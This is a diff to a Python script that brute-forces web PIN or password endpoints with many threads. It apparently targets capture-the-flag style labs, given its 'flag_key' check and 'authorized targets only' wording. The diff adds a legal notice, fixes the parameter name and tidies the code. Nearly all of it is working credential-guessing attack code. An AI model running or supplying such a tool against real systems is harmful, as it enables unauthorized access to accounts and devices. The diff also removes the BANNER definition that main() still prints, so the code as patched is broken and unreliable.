@@ -1,25 +1,3 @@
-#!/usr/bin/env python3
-
-import argparse
-import requests
-import time
-import sys
-from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
-from threading import Lock
-
-
-BANNER = r"""
-   _______   __    _____  ___       ___________  _______   ________  ___________  _______   _______   
-  |   __ "\ |" \  (\"   \|"  \     ("     _   ")/"     "| /"       )("     _   ")/"     "| /"      \  
-  (. |__) :)||  | |.\\   \    |     )__/  \\__/(: ______)(:   \___/  )__/  \\__/(: ______)|:        | 
-  |:  ____/ |:  | |: \.   \\  |        \\_ /    \/    |   \___  \       \\_ /    \/    |  |_____/   ) 
-  (|  /     |.  | |.  \    \. |        |.  |    // ___)_   __/  \\      |.  |    // ___)_  //      /  
- /|__/ \    /\  |\|    \    \ |        \:  |   (:      "| /" \   :)     \:  |   (:      "||:  __   \  
-(_______)  (__\_|_)\___|\____\)         \__|    \_______)(_______/       \__|    \_______)|__|  \___) 
-                                                                                                          
-                                                              
-"""
-
 DESCRIPTION = "Concurrent brute-forcer: 4-digit PIN or dictionary mode — authorized targets only."
 
 DEFAULT_THREADS = 10
@@ -30,7 +8,6 @@ def parse_args():
     p.add_argument("--host", "-H", help="Target IP/host (interactive if omitted)")
     p.add_argument("--port", "-P", type=int, help="Target port (interactive if omitted)")
     p.add_argument("--endpoint", "-e", default=None)
-    p.add_argument("--param", "-k", default=None)
     p.add_argument("--method", "-m", choices=["GET", "POST"], default="GET")
     p.add_argument("--https", action="store_true")
     p.add_argument("--threads", "-t", type=int, default=DEFAULT_THREADS)
@@ -54,10 +31,9 @@ def interactive_inputs(args):
                 print("Please enter a numeric port.")
     if not args.endpoint:
         v = input("Endpoint (e.g., /pin or /dictionary): ").strip()
-        args.endpoint = v or ("/pin" if args.mode=="pin" else "/dictionary")
-    if not args.param:
-        v = input("Parameter name (e.g., pin or password): ").strip()
-        args.param = v or ("pin" if args.mode=="pin" else "password")
+        args.endpoint = v or ("/pin" if args.mode == "pin" else "/dictionary")
+    # fixed parameter name by mode: 'pin' for pin mode, 'password' for dict mode
+    args.param = "pin" if args.mode == "pin" else "password"
     if args.mode == "dict" and not args.wordlist:
         wl = input("Wordlist (local path or URL, leave empty for small default): ").strip()
         args.wordlist = wl or None
@@ -65,7 +41,7 @@ def interactive_inputs(args):
 
 def load_wordlist(path_or_url):
     if not path_or_url:
-        return ["password","123456","12345678","qwerty","letmein"]
+        return ["password", "123456", "12345678", "qwerty", "letmein"]
     if path_or_url.startswith("http://") or path_or_url.startswith("https://"):
         r = requests.get(path_or_url, timeout=10)
         r.raise_for_status()
@@ -82,7 +58,10 @@ def make_request(session, method, url, params_or_data, timeout, retries):
             if method == "GET":
                 r = session.get(url, params=params_or_data, timeout=timeout)
             else:
-                r = session.post(url, data=params_or_data, timeout=timeout)
+                if isinstance(params_or_data, dict):
+                    r = session.post(url, data=params_or_data, timeout=timeout)
+                else:
+                    r = session.post(url, data=str(params_or_data), timeout=timeout)
         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
             attempt += 1
             time.sleep(backoff)
@@ -119,7 +98,7 @@ def worker_task(item, base_url, method, param_name, session, timeout, retries, d
 
 def run_mode(pairs, base_url, method, param_name, args):
     session = requests.Session()
-    session.headers.update({"User-Agent":"BruteForcer/1.0"})
+    session.headers.update({"User-Agent": "BruteForcer/1.0"})
     found = []
     lock = Lock()
     try:
@@ -132,7 +111,6 @@ def run_mode(pairs, base_url, method, param_name, args):
                 fut = ex.submit(worker_task, item, base_url, method, param_name, session, args.timeout, args.retries, args.delay, args.flag_key, args.mode)
                 futures.append((fut, item))
                 idx += 1
-            last_shown = None
             while futures:
                 done, _ = wait([f for f, _ in futures], return_when=FIRST_COMPLETED, timeout=1.0)
                 new_futures = []
@@ -161,9 +139,8 @@ def run_mode(pairs, base_url, method, param_name, args):
                                 return found
                         else:
                             with lock:
-                                label = "Attempted PIN" if args.mode=="pin" else "Attempted password"
+                                label = "Attempted PIN" if args.mode == "pin" else "Attempted password"
                                 print(f"{label}: {item_str}", end="\r", flush=True)
-                                last_shown = item_str
                         if idx < total:
                             next_item = pairs[idx]
                             nfut = ex.submit(worker_task, next_item, base_url, method, param_name, session, args.timeout, args.retries, args.delay, args.flag_key, args.mode)
@@ -190,6 +167,7 @@ def main():
     print(BANNER)
     print(DESCRIPTION)
     print("-" * max(len(DESCRIPTION), 40))
+    print("LEGAL: Only run this against systems you own or have explicit permission to test.")
     print(f"Target: {base_url}  Method: {method}  Param: {param_name}")
     print(f"Threads: {args.threads}, timeout: {args.timeout}s, retries: {args.retries}, delay: {args.delay}s")
     print("Starting... (Ctrl-C to stop)\n")
